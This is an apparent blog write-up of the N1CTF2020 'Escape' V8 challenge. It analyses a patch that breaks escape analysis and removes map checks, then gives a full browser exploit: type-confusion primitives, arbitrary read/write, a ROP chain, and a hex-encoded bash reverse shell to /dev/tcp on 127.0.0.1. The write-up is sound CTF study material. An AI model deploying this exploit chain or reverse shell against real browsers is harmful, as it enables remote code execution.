# V8逃逸分析（escape-analysis）——N1CTF2020 Escape

阅读量 **275004**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-12-04 10:00:22

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t0192a8545633aef27e.jpg)

## 0x00 前言

通过N1CTF2020 Escape一题学习V8的逃逸分析机制。

## 0x01 前置知识

###  逃逸分析

####  概念

逃逸分析(escape-analysis)就是JIT阶段用来分析对象的作用域的一种机制，分析对象的作用域是为了更好的优化代码，生成高效率的JIT代码。  
如下的代码中，对象a发生了`逃逸`，因为a是在函数中创建的对象，通过return返回给外部使用。

    
    
    function func() {
        var a = [];
        return a;
    }
    func();
    

如下的代码也同样发生`逃逸`

    
    
    var a;
    function func() {
        a = [];
    }
    func();
    

逃逸的对象不会在函数执行完毕不会被收回，因此JIT对此类对象不做优化。

####  优化未逃逸的对象

如果对象未发生逃逸，JIT会将其优化为局部变量的形式，如下的代码中,v未发生逃逸

    
    
    function func(a) {
       let v = {x:a,y:a};
       return v.x+v.y;
    }
    

那么该函数会被优化为

    
    
    function func(a) {
       return a+a;
    }
    

从中可用看出，逃逸分析可以优化那些未逃逸的对象，去掉不必要的对象申请，使得代码更加高效。

####  构造一个逃逸

如下，将另一个函数作为一个参数，并在当前这个函数里调用另一个函数，JIT将无法在编译时确定foo会做什么，由此，o会发生逃逸

    
    
    function (foo) {
        let o = {};
        foo(o);
    }
    

####  JIT逃逸分析如何确定变量类型

> In a CFG: One map per basic block, updated imperatively when traversing the  
>  block
>
>   * In an unscheduled graph: One map per effectful node.  
>  This is expensive! Solution: A purely functional map:
>   * Copy: O(1)
>   * Update/Access: O(log n)  
>  This can be achieved with any tree-based map datastructure.  
>  We chose a hash-tree.
>

从`Escape Analysis in
V8`文献中可以看出，在逃逸分析时，使用树结构来保存各个节点的`checkmap`，这样进行复制时，只需要`O(1)`的时间，进行状态更新和访问时，只需要`O(log
n)`的时间。`checkmap`决定了这个节点生成的JIT该以什么方式去操作对象。如果`checkmap`缺失，将导致生成的JIT代码有问题，发生类型混淆。

## 0x02 漏洞分析

###  patch分析

    
    
    diff --git a/src/compiler/escape-analysis.cc b/src/compiler/escape-analysis.cc
    index 2a096b6933..3046d7b04e 100644
    --- a/src/compiler/escape-analysis.cc
    +++ b/src/compiler/escape-analysis.cc
    @@ -178,7 +178,7 @@ class EscapeAnalysisTracker : public ZoneObject {
             : VariableTracker::Scope(&tracker->variable_states_, node, reduction),
               tracker_(tracker),
               reducer_(reducer) {}
    -    const VirtualObject* GetVirtualObject(Node* node) {
    +    VirtualObject* GetVirtualObject(Node* node) {
           VirtualObject* vobject = tracker_->virtual_objects_.Get(node);
           if (vobject) vobject->AddDependency(current_node());
           return vobject;
    @@ -576,10 +576,14 @@ void ReduceNode(const Operator* op, EscapeAnalysisTracker::Scope* current,
         case IrOpcode::kStoreField: {
           Node* object = current->ValueInput(0);
           Node* value = current->ValueInput(1);
    -      const VirtualObject* vobject = current->GetVirtualObject(object);
    +      VirtualObject* vobject = current->GetVirtualObject(object);
           Variable var;
           if (vobject && !vobject->HasEscaped() &&
               vobject->FieldAt(OffsetOfFieldAccess(op)).To(&var)) {
    +        // Attach cached map info to the virtual object.
    +        if (OffsetOfFieldAccess(op) == HeapObject::kMapOffset) {
    +          vobject->SetMap(value);
    +        }
             current->Set(var, value);
             current->MarkForDeletion();
           } else {
    @@ -747,6 +751,17 @@ void ReduceNode(const Operator* op, EscapeAnalysisTracker::Scope* current,
               // yet.
               break;
             }
    +      } else if (vobject) {
    +        Node* cache_map = vobject->Map();
    +        if (cache_map) {
    +          Type const map_type = NodeProperties::GetType(cache_map);
    +          if (map_type.IsHeapConstant() &&
    +              params.maps().contains(
    +                  map_type.AsHeapConstant()->Ref().AsMap().object())) {
    +            current->MarkForDeletion();
    +            break;
    +          }
    +        }
           }
           current->SetEscaped(checked);
           break;
    @@ -804,6 +819,12 @@ void ReduceNode(const Operator* op, EscapeAnalysisTracker::Scope* current,
           for (int i = 0; i < value_input_count; ++i) {
             Node* input = current->ValueInput(i);
             current->SetEscaped(input);
    +
    +        // Invalidate associated map cache for all value input nodes.
    +        VirtualObject* vobject = current->GetVirtualObject(input);
    +        if (vobject) {
    +          vobject->SetMap(nullptr);
    +        }
           }
           if (OperatorProperties::HasContextInput(op)) {
             current->SetEscaped(current->ContextInput());
    diff --git a/src/compiler/escape-analysis.h b/src/compiler/escape-analysis.h
    index 0fbc7d0bdd..ec56488388 100644
    --- a/src/compiler/escape-analysis.h
    +++ b/src/compiler/escape-analysis.h
    @@ -147,11 +147,14 @@ class VirtualObject : public Dependable {
       bool HasEscaped() const { return escaped_; }
       const_iterator begin() const { return fields_.begin(); }
       const_iterator end() const { return fields_.end(); }
    +  Node* Map() const { return map_; }
    +  void SetMap(Node* map) { map_ = map; }
    
      private:
       bool escaped_ = false;
       Id id_;
       ZoneVector<Variable> fields_;
    +  Node* map_;
     };
    
     class EscapeAnalysisResult {
    

从中可用看出，patch文件在`VirtualObject`类中增加了几个变量和函数，并在一些位置进行调用，利用`git apply
patch.diff`将patch文件应用，然后我们分析完整的`escape-analysis.cc`文件，在`ReduceNode`函数中的`IrOpcode::kStoreField`分支时

    
    
        case IrOpcode::kStoreField: {
          Node* object = current->ValueInput(0);
          Node* value = current->ValueInput(1);
          VirtualObject* vobject = current->GetVirtualObject(object);
          Variable var;
          //如果对象没有逃逸
          if (vobject && !vobject->HasEscaped() &&
              vobject->FieldAt(OffsetOfFieldAccess(op)).To(&var)) {
            // Attach cached map info to the virtual object.
            if (OffsetOfFieldAccess(op) == HeapObject::kMapOffset) {
              vobject->SetMap(value); //拷贝一份map值
            }
            current->Set(var, value); //将对象里面保存的值赋给一个变量
            current->MarkForDeletion(); //标记法将该节点删除
          } else {
            current->SetEscaped(object);
            current->SetEscaped(value);
          }
          break;
        }
    

上面的代码可以体现出`逃逸分析`中的`变量替换`思想，即对没有逃逸的对象进行优化。  
接下来继续看`IrOpcode::kCheckMaps`分支补丁上去的代码

    
    
        case IrOpcode::kCheckMaps: {
          CheckMapsParameters params = CheckMapsParametersOf(op);
          Node* checked = current->ValueInput(0);
          const VirtualObject* vobject = current->GetVirtualObject(checked);
          Variable map_field;
          Node* map;
          if (vobject && !vobject->HasEscaped() &&
              vobject->FieldAt(HeapObject::kMapOffset).To(&map_field) &&
              current->Get(map_field).To(&map)) { //未逃逸
            if (map) {
              Type const map_type = NodeProperties::GetType(map);
              if (map_type.IsHeapConstant() &&
                  params.maps().contains(
                      map_type.AsHeapConstant()->Ref().AsMap().object())) {
                current->MarkForDeletion();
                break;
              }
            } else {
              // If the variable has no value, we have not reached the fixed-point
              // yet.
              break;
            }
           //这里是patch上的代码
          } else if (vobject) { //逃逸状态
            Node* cache_map = vobject->Map();
            if (cache_map) { //如果该对象存在map的副本
              Type const map_type = NodeProperties::GetType(cache_map);
              if (map_type.IsHeapConstant() &&
                  params.maps().contains(
                      map_type.AsHeapConstant()->Ref().AsMap().object())) {
                current->MarkForDeletion(); //将这个checkmap标记为删除状态
                break;
              }
            }
          }
          current->SetEscaped(checked);
          break;
        }
    

前面我们介绍过，所有节点的checkmap保存在一棵树上，因此为了方便进行删除，这里用的是`MarkForDeletion()`，只需要`O(1)`的时间即可将当前这个节点的checkmap标记为删除。checkmap被删除的话，那么JIT在处理这个节点时将无法知道其当前的类型，由此会造成`类型混淆(Type
Confusion)`。  
再来看打到`default`分支上的补丁

    
    
        default: {
          // For unknown nodes, treat all value inputs as escaping.
          int value_input_count = op->ValueInputCount();
          for (int i = 0; i < value_input_count; ++i) {
            Node* input = current->ValueInput(i);
            current->SetEscaped(input);
    
            // 将该节点的map_设置为null
            VirtualObject* vobject = current->GetVirtualObject(input);
            if (vobject) {
              vobject->SetMap(nullptr);
            }
          }
          if (OperatorProperties::HasContextInput(op)) {
            current->SetEscaped(current->ContextInput());
          }
          break;
        }
    

可以看出这里又清除了`map_`变量的值

###  POC构造与分析

首先得让`vobject->_map`这个变量被赋值，那么就是发生在没有逃逸的时候，会进入分支

    
    
    if (vobject && !vobject->HasEscaped() &&
              vobject->FieldAt(OffsetOfFieldAccess(op)).To(&var)) {
    

然后得让变量进入逃逸状态，这样当进入`case IrOpcode::kCheckMaps:`时能够进入`else if (vobject) {
//逃逸状态}`分支，但要执行到`current->MarkForDeletion();`语句，还得保证`Node* cache_map =
vobject->Map();`不为空。  
首先构造如下的代码

    
    
    function opt(foo) {
       var a = [1.1]; //未逃逸
       foo(a); //逃逸
       return a[0];
    }
    //触发JIT编译
    for (var i=0;i<0x20000;i++) {
       opt((o)=>{});
    }
    x = Array(0);
    print(opt((o)=>{o[0] = x;})); //在外部函数里改变类型
    

运行后发现不能像我们预期的那样发生类型混淆，通过gdb调试看一下，在三个patch点下断点

    
    
     b escape-analysis.cc:585
     b escape-analysis.cc:738
     b escape-analysis.cc:826
    

通过调试发现仅能在585这一个分支断下，添加`-print-opt-code`选项可以看到整个代码都被JIT优化了

![](https://p4.ssl.qhimg.com/t01322959afaf66b3a3.png)

这样的话JIT编译器可以确定foo做了什么，我们的opt函数就会退化为

    
    
    function opt(foo) {
       var a = [1.1]; 
       return a[0];
    }
    

因此我们得仅让opt这一个函数被优化，由此应该这样

    
    
    function opt(foo) {
       //触发JIT编译
       for (var i=0;i<0x20000;i++) {
       }
       var a = [1.1]; //未逃逸
       foo(a); //逃逸
       return a[0];
    }
    opt((o)=>{});
    x = Array(0);
    print(opt((o)=>{o[0] = x;})); //在外部函数里改变类型
    

这样运行，会发现opt的JIT生成了两次，也就是说`print(opt((o)=>{o[0] =
x;}));`这句的opt调用并没有匹配到之前opt生成的JIT代码，查看第一次生成的JIT代码（关键部分）

    
    
    0x131a00084fa9    e9  49ba009784e7ad7f0000 REX.W movq r10,0x7fade7849700  (CreateShallowArrayLiteral)    ;; off heap target
    0x131a00084fb3    f3  41ffd2         call r10
    0x131a00084fb6    f6  49c7c504000000 REX.W movq r13,0x4
    0x131a00084fbd    fd  e87ef00b00     call 0x131a00144040     ;; deopt-soft deoptimization bailout
    

查看第二次JIT生成的关键代码

    
    
       f8  488945b8       REX.W movq [rbp-0x48],rax
    0x131a000851dc    fc  4c8b4518       REX.W movq r8,[rbp+0x18]
    0x131a000851e0   100  48bf6d8c14081a130000 REX.W movq rdi,0x131a08148c6d    ;; object: 0x131a08148c6d <JSFunction (sfi = 0x131a082d269d)>
    0x131a000851ea   10a  443bc7         cmpl r8,rdi
    0x131a000851ed   10d  0f85db010000   jnz 0x131a000853ce  <+0x2ee>
    

可以看出，第一次并没有匹配参数，而是直接`deopt-soft deoptimization
bailout`，而第二次有匹配参数，判断函数地址是否为指定值，因此，我们再增加几个opt调用看看有什么变化。

    
    
    function opt(foo) {
       //触发JIT编译
       for (var i=0;i<0x20000;i++) {
       }
       var a = [1.1]; //未逃逸
       foo(a); //逃逸
       return a[0];
    }
    opt((o)=>{});
    opt((o)=>{});
    opt((o)=>{});
    x = Array(0);
    print(opt((o)=>{o[0] = x;})); //在外部函数里改变类型
    

![](https://p1.ssl.qhimg.com/t013596a581fda8e77a.png)

我们看到，最后一个标号为2，也就是总共生成了opt函数的3份JIT代码，而我们的js里有4个opt函数调用，也就是说，最后的`print(opt((o)=>{o[0]
= x;}));`成功匹配了JIT代码。  
我们查看最后一份的JIT代码

    
    
    0x2a000854c0     0  488d1df9ffffff REX.W leaq rbx,[rip+0xfffffff9]
    0x2a000854c7     7  483bd9         REX.W cmpq rbx,rcx
    0x2a000854ca     a  7418           jz 0x2a000854e4  <+0x24>
    0x2a000854cc     c  48ba6a00000000000000 REX.W movq rdx,0x6a
    0x2a000854d6    16  49ba20371523787f0000 REX.W movq r10,0x7f7823153720  (Abort)    ;; off heap target
    0x2a000854e0    20  41ffd2         call r10
    0x2a000854e3    23  cc             int3l
    0x2a000854e4    24  8b59d0         movl rbx,[rcx-0x30]
    0x2a000854e7    27  4903dd         REX.W addq rbx,r13
    0x2a000854ea    2a  f6430701       testb [rbx+0x7],0x1
    0x2a000854ee    2e  740d           jz 0x2a000854fd  <+0x3d>
    0x2a000854f0    30  49ba20600523787f0000 REX.W movq r10,0x7f7823056020  (CompileLazyDeoptimizedCode)    ;; off heap target
    0x2a000854fa    3a  41ffe2         jmp r10
    0x2a000854fd    3d  55             push rbp
    0x2a000854fe    3e  4889e5         REX.W movq rbp,rsp
    0x2a00085501    41  56             push rsi
    0x2a00085502    42  57             push rdi
    0x2a00085503    43  50             push rax
    0x2a00085504    44  4883ec10       REX.W subq rsp,0x10
    0x2a00085508    48  488975e0       REX.W movq [rbp-0x20],rsi
    0x2a0008550c    4c  493b6548       REX.W cmpq rsp,[r13+0x48] (external value (StackGuard::address_of_jslimit()))
    0x2a00085510    50  0f86c5010000   jna 0x2a000856db  <+0x21b>
    0x2a00085516    56  493b6548       REX.W cmpq rsp,[r13+0x48] (external value (StackGuard::address_of_jslimit()))
    0x2a0008551a    5a  0f86f4010000   jna 0x2a00085714  <+0x254>
    0x2a00085520    60  b901000000     movl rcx,0x1
    0x2a00085525    65  660f1f840000000000 nop
    0x2a0008552e    6e  6690           nop
    0x2a00085530    70  81f900000200   cmpl rcx,0x20000
    0x2a00085536    76  0f8332000000   jnc 0x2a0008556e  <+0xae>
    0x2a0008553c    7c  83c101         addl rcx,0x1
    0x2a0008553f    7f  49ba0000000001000000 REX.W movq r10,0x100000000
    0x2a00085549    89  4c3bd1         REX.W cmpq r10,rcx
    0x2a0008554c    8c  7715           ja 0x2a00085563  <+0xa3>
    0x2a0008554e    8e  48ba0200000000000000 REX.W movq rdx,0x2
    0x2a00085558    98  4c8b1579ffffff REX.W movq r10,[rip+0xffffff79]
    0x2a0008555f    9f  41ffd2         call r10
    0x2a00085562    a2  cc             int3l
    0x2a00085563    a3  493b6548       REX.W cmpq rsp,[r13+0x48] (external value (StackGuard::address_of_jslimit()))
    0x2a00085567    a7  77c7           ja 0x2a00085530  <+0x70>
    0x2a00085569    a9  e9cb010000     jmp 0x2a00085739  <+0x279>
    0x2a0008556e    ae  48b9f8c6112c25560000 REX.W movq rcx,0x56252c11c6f8    ;; external reference (Heap::NewSpaceAllocationTopAddress())
    0x2a00085578    b8  4c8b01         REX.W movq r8,[rcx]
    0x2a0008557b    bb  4d8d4820       REX.W leaq r9,[r8+0x20]
    0x2a0008557f    bf  49bb00c7112c25560000 REX.W movq r11,0x56252c11c700    ;; external reference (Heap::NewSpaceAllocationLimitAddress())
    .................................................................
    

可以看到，最后一份JIT代码中，已经不再对参数进行匹配了，也就是说，即使我们记下来继续调用opt()，参数无论为什么，都会匹配到，我们测试一下

    
    
    function opt(foo) {
       //触发JIT编译
       for (var i=0;i<0x20000;i++) {
       }
       var a = [1.1]; //未逃逸
       foo(a); //逃逸
       return a[0];
    }
    opt((o)=>{});
    opt((o)=>{});
    opt((o)=>{});
    x = Array(0);
    //print(opt((o)=>{o[0] = x;})); //在外部函数里改变类型
    opt(1);
    opt({});
    

可以看到也只生成了3份JIT代码，最后两句的调用都直接走opt的JIT成功了。

![](https://p0.ssl.qhimg.com/t01789815d9df6a03cc.png)

于是，我们的代码可以用for循环来精简一下

    
    
    function opt(foo) {
       //触发JIT编译
       for (var i=0;i<0x20000;i++) {
       }
       var a = [1.1]; //未逃逸
       foo(a); //逃逸
       return a[0];
    }
    //生成多个JIT模板
    for (var i=0;i<0x10;i++) {
       opt((o)=>{});
    }
    x = Array(0);
    print(opt((o)=>{o[0] = x;})); //在外部函数里改变类型
    

运行后，发现仍然不能发生类型混淆，继续调试  
先是`(v8::internal::compiler::VirtualObject *) 0x5643165e5410`设置了`map_`值

![](https://p4.ssl.qhimg.com/t01a5211fc0196ba77b.png)

然后`(v8::internal::compiler::VirtualObject *) 0x5643165e5770`设置了`map_`值

![](https://p2.ssl.qhimg.com/t015eb61e72a337ec44.png)

接下来发现`(v8::internal::compiler::VirtualObject *) 0x5643165e5770`的`map_`值被清空

![](https://p0.ssl.qhimg.com/t01f7547a83a3b77486.png)

接下来到这里，这个分支是当检测到对象逃逸时才会到达，由于前一步把这个`vobject`的`map_`给清空了，导致条件不成立，无法执行到`current->MarkForDeletion();`

![](https://p1.ssl.qhimg.com/t01c91887bae3f5e5f0.png)

上述POC失败的原因是因为在`case
IrOpcode::kCheckMaps:`之前先进入了`default`把`map_`值给清空了，我们可以再对象里再裹一层对象试试。

    
    
    function opt(foo) {
       //触发JIT编译
       for (var i=0;i<0x20000;i++) {
       }
       var a = [1.1]; //未逃逸
       var b = [a]; //未逃逸
       foo(b); //逃逸
       return a[0];
    }
    //生成多个JIT模板
    for (var i=0;i<0x10;i++) {
       opt((o)=>{});
    }
    x = Array(0);
    print(opt((o)=>{o[0][0] = x;})); //在外部函数里改变类型
    

接下来我们重新调试，我们发现`(const v8::internal::compiler::VirtualObject *)
0x558f95f216c0`这个节点的`checkmaps`被删除了，因此将造成类型混淆

![](https://p1.ssl.qhimg.com/t01bd45c25aea783475.png)

继续运行，发现输出了对象的地址，发生了类型混淆

    
    
    pwndbg> p vobject
    $16 = (const v8::internal::compiler::VirtualObject *) 0x558f95f216c0
    pwndbg> c
    Continuing.
    4.765298071534956e-270
    [Thread 0x7f202c139700 (LWP 2742) exited]
    [Thread 0x7f202c93a700 (LWP 2741) exited]
    [Thread 0x7f202d13b700 (LWP 2740) exited]
    [Inferior 1 (process 2739) exited normally]
    pwndbg>
    

如下是有漏洞的JIT代码

    
    
    0x2343000857c8   1a8  488b7d18       REX.W movq rdi,[rbp+0x18]
    0x2343000857cc   1ac  b801000000     movl rax,0x1
    0x2343000857d1   1b1  49bae0bfb6d9a77f0000 REX.W movq r10,0x7fa7d9b6bfe0  (Call_ReceiverIsNullOrUndefined)    ;; off heap target
    0x2343000857db   1bb  41ffd2         call r10 ;调用外部函数
    0x2343000857de   1be  488b4dd8       REX.W movq rcx,[rbp-0x28]
    0x2343000857e2   1c2  448b4107       movl r8,[rcx+0x7] ;以DOUBLE_ELEMENTS的方式取数据
    0x2343000857e6   1c6  4d03c5         REX.W addq r8,r13
    0x2343000857e9   1c9  448b490b       movl r9,[rcx+0xb]
    0x2343000857ed   1cd  41d1f9         sarl r9, 1
    0x2343000857f0   1d0  4183f900       cmpl r9,0x0
    0x2343000857f4   1d4  0f869a010000   jna 0x234300085994  <+0x374>
    0x2343000857fa   1da  c4c17b104007   vmovsd xmm0,[r8+0x7]
    0x234300085800   1e0  c5fb2cc8       vcvttsd2si rcx,xmm0
    0x234300085804   1e4  c5832ac9       vcvtlsi2sd xmm1,xmm15,rcx
    0x234300085808   1e8  c5f92ec8       vucomisd xmm1,xmm0
    0x23430008580c   1ec  0f8a39000000   jpe 0x23430008584b  <+0x22b>
    0x234300085812   1f2  0f8533000000   jnz 0x23430008584b  <+0x22b>
    0x234300085818   1f8  83f900         cmpl rcx,0x0
    0x23430008581b   1fb  0f8428010000   jz 0x234300085949  <+0x329>
    

如下是无漏洞的JIT代码

    
    
    0x286d000857b0   1b0  49ba405e010f7e7f0000 REX.W movq r10,0x7f7e0f015e40  (Call_ReceiverIsNullOrUndefined)    ;; off heap target
    0x286d000857ba   1ba  41ffd2         call r10
    0x286d000857bd   1bd  488b4dd8       REX.W movq rcx,[rbp-0x28]
    0x286d000857c1   1c1  41b8fd383008   movl r8,0x83038fd       ;; (compressed) object: 0x286d083038fd <Map(PACKED_DOUBLE_ELEMENTS)>
    0x286d000857c7   1c7  443941ff       cmpl [rcx-0x1],r8
    0x286d000857cb   1cb  0f859e010000   jnz 0x286d0008596f  <+0x36f>
    0x286d000857d1   1d1  448b4107       movl r8,[rcx+0x7]
    0x286d000857d5   1d5  4d03c5         REX.W addq r8,r13
    0x286d000857d8   1d8  448b490b       movl r9,[rcx+0xb]
    0x286d000857dc   1dc  41d1f9         sarl r9, 1
    0x286d000857df   1df  4183f900       cmpl r9,0x0
    0x286d000857e3   1e3  0f8692010000   jna 0x286d0008597b  <+0x37b>
    0x286d000857e9   1e9  c4c17b104007   vmovsd xmm0,[r8+0x7]
    0x286d000857ef   1ef  c5fb2cc8       vcvttsd2si rcx,xmm0
    0x286d000857f3   1f3  c5832ac9       vcvtlsi2sd xmm1,xmm15,rcx
    0x286d000857f7   1f7  c5f92ec8       vucomisd xmm1,xmm0
    0x286d000857fb   1fb  0f8a25000000   jpe 0x286d00085826  <+0x226>
    0x286d00085801   201  0f851f000000   jnz 0x286d00085826  <+0x226>
    0x286d00085807   207  83f900         cmpl rcx,0x0
    0x286d0008580a   20a  0f8414010000   jz 0x286d00085924  <+0x324>
    

可以发现，由于逃逸分析时把`checkmaps`删除了，使得生成的JIT代码里调用完函数后少了如下的检查代码，由此发生类型混淆

    
    
    0x286d000857bd   1bd  488b4dd8       REX.W movq rcx,[rbp-0x28]
    0x286d000857c1   1c1  41b8fd383008   movl r8,0x83038fd       ;; (compressed) object: 0x286d083038fd <Map(PACKED_DOUBLE_ELEMENTS)>
    0x286d000857c7   1c7  443941ff       cmpl [rcx-0x1],r8
    0x286d000857cb   1cb  0f859e010000   jnz 0x286d0008596f  <+0x36f>
    

## 0x03 漏洞利用

利用类型混淆，构造addressOf和fakeObj原语，然后利用两个原语伪造一个ArrayBuffer，实现任意地址读写。然后可以创建一个`div`对象，利用任意地址读写篡改其虚表，然后执行对应的操作劫持程序流

    
    
    <!DOCTYPE html>
    <html>
      <body>
        <script>
    var buf = new ArrayBuffer(0x8);
    var dv = new DataView(buf);
    
    function p64f(value1,value2) {
       dv.setUint32(0,value1,true);
       dv.setUint32(0x4,value2,true);
       return dv.getFloat64(0,true);
    }
    
    function i2f64(value) {
       dv.setBigUint64(0,BigInt(value),true);
       return dv.getFloat64(0,true);
    }
    
    function u64f(value) {
       dv.setFloat64(0,value,true);
       return dv.getBigUint64(0,true);
    }
    
    function u32f(value) {
       dv.setFloat64(0,value,true);
       return dv.getUint32(0,true);
    }
    
    function i2f(value) {
       dv.setUint32(0,value,true);
       return dv.getFloat32(0,true);
    }
    
    //
    function opt0(o) {
       for(var i = 0; i < 200000; i++) { }
       let a = [1.1,2.2,3.3,4.4];
       let b = [a];
       o(b);
       return a[0];
    }
    
    
    for (var i=0;i<10;i++) {
       opt0((o)=>{});
    }
    
    
    var spary_size = 0x201;
    var spary = new Array(spary_size);
    for (var i=0;i<spary_size;i+=3) {
       spary[i] = new Array(1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9,10.10,11.11,12.12,13.13,14.14,15.15);
       spary[i+1] = new ArrayBuffer(0x2000);
       spary[i+2] = new Float64Array(0x5);
    }
    
    function addressOf(obj) {
       var addr = opt0((o)=>{o[0][0] = obj;});
       return u32f(addr) - 1;
    }
    
    function fakeObject(addr) {
       var fval = i2f64(addr + 1);
       let f = eval(`(x,y,val)=>{
         for(var i = 0; i < 200000; i++) { }
         let a = [1.1,2.2,3.3,4.4];
         let b = [a];
         x(b);
         a[0] = val;
         return y(b);
       }`);
       for (var i=0;i<10;i++) {
          f((o)=>{},(o)=>{},fval);
       }
       return f((o)=>{o[0][0] = {};},(o)=>{return o[0][0];},fval);
    }
    
    let arr = spary[spary_size-0x3];
    let arr_address = addressOf(arr);
    let proto_addr = addressOf(Array.prototype);
    
    //fake a FixedDoubleArray Map
    arr[0] = p64f(0x08042115,0x18040404);
    arr[1] = p64f(0x29000423,0x0a0007ff);
    arr[2] = p64f(proto_addr+1,0);
    //alert(arr_address.toString(16));
    
    let element_addr = arr_address + 0x14;
    let fake_element = element_addr+0x44;
    
    //fake a FixedDoubleArray
    arr[4] = p64f(0,element_addr+0x8+0x1);
    arr[5] = p64f(0x08042229,fake_element+1);
    arr[6] = p64f(0x7ffffffe,0);
    
    //fake a FixedDoubleArray's element
    arr[7] = p64f(0,0x08042ab1);
    arr[8] = p64f(0x7ffffffe,0);
    
    
    var arb_fixeddouble_arr = fakeObject(element_addr + 0x2c);
    
    //leak backing store
    backing_store_addr = u64f(arb_fixeddouble_arr[0x9]);
    heap_t_addr = u64f(arb_fixeddouble_arr[0xa])
    //alert(backing_store_addr.toString(16));
    //alert(heap_t_addr.toString(16));
    //leak compression ptr high byte
    compression_high_bytes = u32f(arb_fixeddouble_arr[0x20]);
    //alert(compression_high_bytes.toString(16));
    
    function addressOf_full(obj) {
       var addr = addressOf(obj);
       return (BigInt(compression_high_bytes) << 32n) + BigInt(addr);
    }
    
    
    
    arr = spary[spary_size-0x6];
    arr_address = addressOf(arr);
    proto_addr = addressOf(ArrayBuffer.prototype);
    
    //fake a ArrayBuffer Map
    arr[0] = p64f(0x08042115,0x140e0e0e);
    arr[1] = p64f(0x19000424,0x084003ff);
    arr[2] = p64f(proto_addr+1,0);
    
    element_addr = arr_address + 0x14;
    fake_element = element_addr+0x44;
    
    //fake a ArrayBuffer
    arr[4] = p64f(0,element_addr+0x8+0x1);
    arr[5] = p64f(0x08042229,0x08042229);
    arr[6] = p64f(0xffffffff,0);
    arr[7] = p64f(0,0);
    arr[9] = p64f(0,2);
    var arb_arraybuffer = fakeObject(element_addr + 0x2c);
    var adv = new DataView(arb_arraybuffer);
    
    function read64(addr) {
       arr[7] = i2f64(addr);
       return adv.getBigUint64(0,true);
    }
    
    function write64(addr,value) {
       arr[7] = i2f64(addr);
       adv.setBigUint64(0,BigInt(value),true);
    }
    
    var tmp = read64(heap_t_addr + 0x10n);
    var elf_base = read64(tmp) - 0xa76f5c0n;
    xchg_rax_rsp = elf_base + 0x872BD7En;
    pop_rdi = elf_base + 0xA63BE3Bn;
    libc_start_main_got = elf_base + 0x000000000ACA7348n;
    var libc_base = read64(libc_start_main_got) - 0x21ab0n;
    var system_addr = libc_base + 0x4f4e0n;
    //alert("libc_base=" + libc_base.toString(16));
    //
    let div = document.createElement("div");
    let div_addr = addressOf_full(div);
    let divobj_addr = read64(div_addr + 20n);
    
    //rop chain
    write64(backing_store_addr+0x1000n+0x50n,xchg_rax_rsp);
    write64(backing_store_addr+0x1000n,pop_rdi);
    write64(backing_store_addr+0x1000n+0x8n,backing_store_addr+0x1000n+0x100n);
    write64(backing_store_addr+0x1000n+0x10n,system_addr);
    
    //cmd
    write64(backing_store_addr+0x1000n+0x100n,0x7361622F6E69622Fn);
    write64(backing_store_addr+0x1000n+0x108n,0x20263E20692D2068n);
    write64(backing_store_addr+0x1000n+0x110n,0x7063742F7665642Fn);
    write64(backing_store_addr+0x1000n+0x118n,0x302E302E3732312Fn);
    write64(backing_store_addr+0x1000n+0x120n,0x20363636362F312En);
    write64(backing_store_addr+0x1000n+0x128n,0x31263E30n);
    
    
    //fake vtable ptr
    write64(divobj_addr,backing_store_addr+0x1000n);
    //alert("div_addr="+div_addr.toString(16));
    div.dispatchEvent(new Event('click'));
    
        </script>
      </body>
    </html>
    

## 0x04 感想

在写这篇文章的过程中，某些疑难点无形中理解了，以后得坚持写文章记录过程。

## 0x05 参考

[JVM之逃逸分析](https://zhuanlan.zhihu.com/p/59215831)  
[深入理解Java中的逃逸分析](https://blog.csdn.net/hollis_chuang/article/details/80922794)  
[[JVM] 逃逸分析(Escape Analysis）](https://www.cnblogs.com/aiqiqi/p/10650394.html)  
[Escape Analysis in V8](https://www.jfokus.se/jfokus18/preso/Escape-Analysis-in-V8.pdf)  
[Pwn2Win OmniTmizer](https://yichenchai.github.io/blog/omnitmizer)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **ha1vk@赛宁网安天虞实验室** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/224317](/post/id/224317)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [浏览器](/tag/浏览器)
  * [Pwn](/tag/Pwn)
  * [二进制安全](/tag/二进制安全)
  * [逃逸](/tag/逃逸)

 **+1** __20赞

 __收藏

![](https://p5.ssl.qhimg.com/t015704b4b2e374eb33.jpg) ha1vk@赛宁网安天虞实验室

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

